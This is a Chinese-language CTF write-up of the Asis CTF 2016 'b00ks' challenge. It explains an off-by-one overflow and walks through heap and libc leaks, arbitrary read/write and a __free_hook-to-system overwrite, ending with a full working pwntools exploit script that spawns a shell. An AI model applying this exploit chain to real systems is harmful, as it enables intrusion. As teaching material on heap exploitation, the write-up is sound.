---
title: "Off By One"
date: 2019-08-06T22:13:24+08:00
tags: [""]
categories: ["工具使用接口", "CTF-WriteUp"]
---

> 题目：`Asis CTF 2016 b00ks`


## 文件信息

首先检查保护等级：

```bash
$ checksec ./b00ks
[*] '/mnt/d/program/ctf/ctf-wiki/offbyone/b00ks'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

程序没有开启栈保护。查看各个段的权限：

```bash
gdb-peda$ vmmap 
Warning: not running
Start              End                Perm      Name
0x00000808         0x0000135d         rx-p      /mnt/d/program/ctf/ctf-wiki/offbyone/b00ks
0x00000238         0x00001914         r--p      /mnt/d/program/ctf/ctf-wiki/offbyone/b00ks
0x00201d58         0x00202100         rw-p      /mnt/d/program/ctf/ctf-wiki/offbyone/b00ks
```

各个段的地址则可以通过以下的方式查看：

```bash
$ readelf --section-headers ./b00ks
There are 27 section headers, starting at offset 0x2160:
......
```

## 程序逻辑

### `main`

首先看 `main` 函数，将其中的调用的函数重命名之后函数的名字很明显了：

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 savedregs; // [rsp+20h] [rbp+0h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  print_welcome();
  read_author_name();
  while ( (unsigned int)menu() != 6 )
  {
    switch ( (unsigned int)&savedregs )
    {
      case 1u: create(); break;
      case 2u: delete(); break;
      case 3u: edit(); break;
      case 4u: detail(); break;
      case 5u: read_author_name(); break;
      default:
        puts("Wrong option");
        break;
    }
  }
  puts("Thanks to use our library software");
  return 0LL;
}
```

### `create`

通过阅读函数的伪代码，该函数大致实现的是下面的程序流程图：

```
+---------+       +-------------+        +---------+       +----------------+
|read size------->|read bookname-------->|read size------->|read description|
+---------+       +-------------+        +---------+       +----------------+
```

最后数据存入 `GLOBAL_LIBRARY` 全局变量中，其结构如下：

```
       .bss                  heap
   GLOBAL_LIBRARY                                       
     +-------+                                          
   0 |8 bytes|           +---------------+              
     ---------           |bookname string|<------------+
   1 |8 bytes|           +---------------+             |
     ---------           +------------------+          |
   2 |8 bytes|           |description string|<----+    |
     ---------           +------------------+     |    |
  ...|       |                                    |    |
     ---------           +----------+             |    |
  18 |8 bytes|-------->0 |seq number|             |    |
     ---------           ------------             |    |
  19 |8 bytes|         1 |bookname_p|-------------|----+
     +-------+           ------------             |     
                       2 |descript_p|-------------+     
                         ------------
                       3 |descript_l|(prev-4-bytes)
                         ------------ 
```

### `delete`

在这个函数中，先读取一个 id，然后用了一个 `for` 循环找到需要释放的位置，找到 `ID` 所在的位置之后，执行后面的释放内存的函数。并没有发现什么问题。

### `edit`

该函数通过同样的方式找到了 `for` 循环需要释放的位置之后，调用了 `read_str` 函数，以之前 `create` 存储在内存中的结构作为传参，通过同样的方式设置了 `description` 的内存。并没有发现什么问题。

### `detail`

遍历 `GLOBAL_LIBRARY` 中的所有内容。

将 `id` 指向的数字打印出来，将 `bookname`、`bookdescription` 与 `authorname` 指向的字符串打印出来。

### `read_str`

在 `read_auther_name()`、`create()`、`edit` 这些函数中，都调用了一个自己实现的读取字符串的函数 `read_str()`。它传入的第一个参数是一个字符型指针，第二个参数都是 `指针分配的内存大小 - 1`。

它的伪代码如下：

```c
signed __int64 __fastcall read_str(_BYTE *ptr, int len_1)
{
  int i; // [rsp+14h] [rbp-Ch]
  _BYTE *buf; // [rsp+18h] [rbp-8h]

  if ( len_1 <= 0 )
    return 0LL;
  buf = ptr;
  for ( i = 0; ; ++i )
  {
    if ( (unsigned int)read(0, buf, 1uLL) != 1 )
      return 1LL;
    if ( *buf == '\n' )
      break;
    ++buf;
    if ( i == len_1 )
      break;
  }
  *buf = 0;
  return 0LL;
}
```

## 漏洞发现

我们仔细研究 `read_str()` 这个函数之后会发现，如果在达到输入的长度时，`for` 循环结束时应该是以下状态：

```
       +--------+         
     0 |        |         
       ----------         
   ... |        |         
       ----------         
  len-1|  top   |<----i   
       ----------         
  len  |overflow|<----buff
       +--------+ 
```

可见最后一个 `0` 字节是写向了缓冲区外部，是溢出了。这个函数是存在 `off-by-one` 漏洞的。

### leak_heap

首先我们可以利用 `author_name` 在 `.bss` 区的溢出漏洞，打印 `GLOBAL_LIBRARY` 第一项的内容，而这一项是一个指向 `heap` 段的地址，通过这个方法我们可以泄露堆地址：

```python
        # todo: leak heap addr
        self.set_author_name("A" * 32)
        self.create(0x18, "B" * 0x18, 0x100, "C" * 0x100)  # 1
        self.detail()
        author = [ld["Author"] for ld in self.library_detail if ld["ID"] == "1"]
        assert len(author) == 1
        library0 = u64(author[0][32:] + "\x00\x00")
        print "leak library0 address: %s" % hex(library0)
```

泄露之后发现这个泄露的堆地址是 `0x55C106CBC2B0`，然后我们动态调式查看堆地址的内容可以发现：

```
000055C106CBC260  00 00 00 00 00 00 00 00  21 00 00 00 00 00 00 00  ........!.......
000055C106CBC270  4C 65 61 6B 48 65 61 70  00 00 00 00 00 00 00 00  LeakHeap........
000055C106CBC280  00 00 00 00 00 00 00 00  21 00 00 00 00 00 00 00  ........!.......
000055C106CBC290  4C 65 61 6B 44 65 73 63  00 00 00 00 00 00 00 00  LeakDesc........
000055C106CBC2A0  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00  ........1.......
000055C106CBC2B0  01 00 00 00 00 00 00 00  70 C2 CB 06 C1 55 00 00  ........p.......
000055C106CBC2C0  90 C2 CB 06 C1 55 00 00  18 00 00 00 00 00 00 00  ................
000055C106CBC2D0  00 00 00 00 00 00 00 00  31 FD 01 00 00 00 00 00  ........1.......
```

容易看出，上面截取的地址是三个连续的堆块。`book name`、`book description` 与 `book` 三个内存块。

### get_addr_write

下面我们尝试获取任意地址写。同样根据上面的思路：

1. 我们通过 `.bss` 段的溢出漏洞，可以覆盖 `LIBRARY[0]` 的最低字节，从而更改它指向的地址。
2. 为了控制新的 `LIBRARY[0]`，可以通过将 `description` 的大小控制大于 `0x100`，这样 `LIBRARY[0]` 的地址就一定会落在它的 `Description` 上；
3. 我们将新的 `LIBRARY[0]` 的 `Decription` 指向 `LIBRARY[1]`，于是我们就可以通过 `LIBRARY[0]` 指定目标地址，通过 `LIBRARY[1]` 修改地址的内容；

画图说明逻辑更加直观。比如，原本有一个正常的两个分配的书块：

```
                             Heap Segment           
                                                    
                         +--------------------+     
                    0x18 | book1 name buffer  |     
                         ----------------------     
                   0x100 | book1 desc buffer  |     
+-----------+            ----------------------     
| library[0]|----------->| book1 seqnumber    |     
-------------       0x20 | book1 name ptr     |     
| library[1]|-+          | book1 desc ptr     |     
------------- |          | book1 desc size    |     
|  ......   | |          +--------------------+     
+-----------+ |          +--------------------+     
              |     0x20 | book2 name buffer  |     
              |          ----------------------     
              |     0x20 | book2 desc buffer  |     
              |          ----------------------     
              +--------->| book2 seqnumber    |     
                    0x20 | book2 name ptr     |     
                         | book2 desc ptr     |     
                         | book2 desc size    |     
                         +--------------------+     
```

经过我们控制 `LIBRARY[0]` 的地址的之后可以形成如下的形式：

```
                                Heap Segment 
                                                             
                             +--------------------+          
                        0x18 | book1 name buffer  |          
                             ----------------------          
                       0x100 | book1 desc buffer  |          
   +-----------+             |                    |          
   | library[0]|------------>| control seqnumber  | 1        
   -------------             | control name ptr   |          
   | library[1]|--+          | control desc ptr   |---------+
   -------------  |          | control desc size  | 0x100   |
   |  ......   |  |          ----------------------         |
   +-----------+  |          | book1 seqnumber    | 1       |
                  |     0x20 | book1 name ptr     |         |
                  |          | book1 desc ptr     |         |
                  |          | book1 desc size    | 0x100   |
                  |          +--------------------+         |
                  |          +--------------------+         |
                  |     0x20 | book2 name buffer  |         |
                  |          ----------------------         |
                  |     0x20 | book2 desc buffer  |         |
                  |          ----------------------         |
                  +--------> | book2 seqnumber    | 2       |
                        0x20 | book2 name ptr     |         |
                             | book2 desc ptr     |<--------+
                             | book2 desc size    | 0x20     
                             +--------------------+          
```

于是我们可以通过 `LIBRARY[0]` 控制 `LIBRARY[1]` 的指针，从而修改/读取任意地址。

泄露的脚本如下：

```python
        # todo: get arbitrary address write&read
        self.create(0x20, "D" * 0x20, 0x20, "E" * 0x20)  # 2
        offset = library0 & 0xff
        assert offset >= 0x20
        payload = "C"*(0x100+0x10 - offset) + p64(0x1) \
                  + p64(library0 + 0x20 + 0x10) \
                  + p64(library0 + 0x20 + 0x30 + 0x30 + 0x10 + 0x10) \
                  + p64(0x100)
        self.edit(1, payload)
        self.set_author_name("A" * 32)
        print "get arbitrary address write&read"
```

可以通过下面两个函数进行任意读写：

```python
    def write_to(self, addr, content):
        self.edit(1, p64(addr) + p64(len(content) + 1))
        self.edit(2, content)

    def read_from(self, addr):
        self.edit(1, p64(addr))
        self.detail()
        desc = [ld["Description"] for ld in self.library_detail if ld["ID"] == "2"]
        assert len(desc) == 1
        return u64((desc[0] + "\x00\x00")[:8])
```

### leak_libc

除此之外我们还需要泄露 `libc地址/栈地址`，之后通过写 `got` 表劫持流程或者写 `__malloc_hook` 劫持流程等。

因为 `off-by-one` 漏洞的存在，我们可以利用 `unlink` 方法，因为此时堆区就被放入了`unsorted bins` 的双向链表中，这样就可以将 `main_arena.bins` 的地址写入堆区中。

但是我们本地调试环境是 `libc 2.28`，在 `2.26` 之后 `glibc` 引入了 `tcache` 机制，我们需要先释放 7 个 `chunk` 填充 `tcache` 垃圾箱，从第八个开始才会进入 `unsorted bins`。代码如下：

```python
        # todo: leak libc address via unsorted bin address
        for i in range(4):
            self.create(0x100, "F" * 0x100, 0x100, "G" * 0x100)  # 3,4,5,6
        for i in range(4):
            self.delete(i + 3)  # 3,4,5,6
        libcbase = self.read_from(library0 + 0x8c0) - 0x1bbca0
        print "leak libc base address: %s" % hex(libcbase)
```

### write `__free_hook`

在 `libc` 的 `free` 函数执行之前，会检查一个地址中是否存在函数。如果存在则传入目标地址并且执行它，这个地址叫做 `__free_hook`，我们可以将这个地址指向 `system` 函数，触发释放就可以得到 `shell`。

为了执行 `system("/bin/sh")`，我们需要执行以下的两步操作：

1. 将 `/bin/sh` 字符串写入需要释放的内存区域中；
2. 将 `__free_hook` 对应的地址指向 `system` 函数。

```python
        # todo:
        #   1. write "/bin/sh" to library[2] name
        #   2. replace `__free_hook` as `system`
        bin_sh_addr = libcbase + next(self.libc.search("/bin/sh"))
        free_hook_addr = libcbase + self.libc.symbols["__free_hook"]
        system_addr = libcbase + self.libc.symbols["system"]
        print "'/bin/sh' address: %x" % bin_sh_addr
        print "_free_hook address: %x" % free_hook_addr
        print "system address: %x" % system_addr
        self.create(0x20, "/bin/sh", 0x20, "/bin/sh")  # 7
        self.write_to(free_hook_addr, p64(system_addr))
```

### get_shell

最后就可以触发释放函数拿到主机 shell：

```python
        # todo: get shell
        self.p.sendline("2")
        self.p.sendlineafter("Enter the book id you want to delete: ", "7")
        self.p.interactive()
```

## 脚本

完整的 `exp.py` 如下：

```python
#!/usr/bin/env python2
# coding=utf-8
from pwn import *


class Challenge:
    def __init__(self, local=True):
        self.local = local
        self.p = process(["./b00ks"])
        self.libc = ELF("/lib/x86_64-linux-gnu/libc-2.28.so")
        self.library_detail = []

    def gdb(self, script):
        assert self.local
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(proc.pidof(self.p)[0], gdbscript=script)

    def create(self, book_name_size, book_name, desc_size, description):
        self.p.sendline("1")
        self.p.sendlineafter("Enter book name size: ", str(book_name_size))
        self.p.sendlineafter("Enter book name (Max 32 chars): ", book_name)
        self.p.sendlineafter("Enter book description size: ", str(desc_size))
        self.p.sendlineafter("Enter book description: ", description)
        self.p.recvuntil("> ")

    def delete(self, book_id):
        self.p.sendline("2")
        self.p.sendlineafter("Enter the book id you want to delete: ", str(book_id))
        self.p.recvuntil("> ")

    def edit(self, book_id, new_desc):
        self.p.sendline("3")
        self.p.sendlineafter("Enter the book id you want to edit: ", str(book_id))
        self.p.sendlineafter("Enter new book description: ", new_desc)
        self.p.recvuntil("> ")

    def detail(self):
        self.p.sendline("4")
        detail = self.p.recvuntil("\n\n")
        self.library_detail = [
            {
                ("ID" if len(item) == 1 else item[0]): (item[0] if len(item) == 1 else item[1])
                for item in [i.split(": ") for i in dp.strip("\n").split("\n")]
            } for dp in detail.split("\nID: ")
        ]
        self.p.recvuntil("> ")

    def set_author_name(self, author_name, init=False):
        if not init:
            self.p.sendline("5")
        self.p.sendlineafter("Enter author name: ", author_name)
        self.p.recvuntil("> ")

    def write_to(self, addr, content):
        self.edit(1, p64(addr) + p64(len(content) + 1))
        self.edit(2, content)

    def read_from(self, addr):
        self.edit(1, p64(addr))
        self.detail()
        desc = [ld["Description"] for ld in self.library_detail if ld["ID"] == "2"]
        assert len(desc) == 1
        return u64((desc[0] + "\x00\x00")[:8])

    def pwn(self):
        self.set_author_name("shesl-meow", init=True)
        # todo: leak heap addr
        self.set_author_name("A" * 32)
        self.create(0x18, "B" * 0x18, 0x100, "C" * 0x100)  # 1
        self.detail()
        author = [ld["Author"] for ld in self.library_detail if ld["ID"] == "1"]
        assert len(author) == 1
        library0 = u64(author[0][32:] + "\x00\x00")
        print "leak library0 address: %s" % hex(library0)

        # todo: get arbitrary address write&read
        self.create(0x20, "D" * 0x20, 0x20, "E" * 0x20)  # 2
        offset = library0 & 0xff
        assert offset >= 0x20
        payload = "C"*(0x100+0x10 - offset) + p64(0x1) \
                  + p64(library0 + 0x20 + 0x10) \
                  + p64(library0 + 0x20 + 0x30 + 0x30 + 0x10 + 0x10) \
                  + p64(0x100)
        self.edit(1, payload)
        self.set_author_name("A" * 32)
        print "get arbitrary address write&read"

        # todo: leak libc address via unsorted bin address
        for i in range(4):
            self.create(0x100, "F" * 0x100, 0x100, "G" * 0x100)  # 3,4,5,6
        for i in range(4):
            self.delete(i + 3)  # 3,4,5,6
        libcbase = self.read_from(library0 + 0x8c0) - 0x1bbca0
        print "libc base address: %x" % libcbase

        # todo:
        #   1. write "/bin/sh" to library[2] name
        #   2. replace `__free_hook` as `system`
        bin_sh_addr = libcbase + next(self.libc.search("/bin/sh"))
        free_hook_addr = libcbase + self.libc.symbols["__free_hook"]
        system_addr = libcbase + self.libc.symbols["system"]
        print "'/bin/sh' address: %x" % bin_sh_addr
        print "_free_hook address: %x" % free_hook_addr
        print "system address: %x" % system_addr
        self.create(0x20, "/bin/sh", 0x20, "/bin/sh")  # 7
        self.write_to(free_hook_addr, p64(system_addr))

        # todo: get shell
        self.p.sendline("2")
        self.p.sendlineafter("Enter the book id you want to delete: ", "7")
        self.p.interactive()


if __name__ == "__main__":
    c = Challenge()
    c.pwn()
```


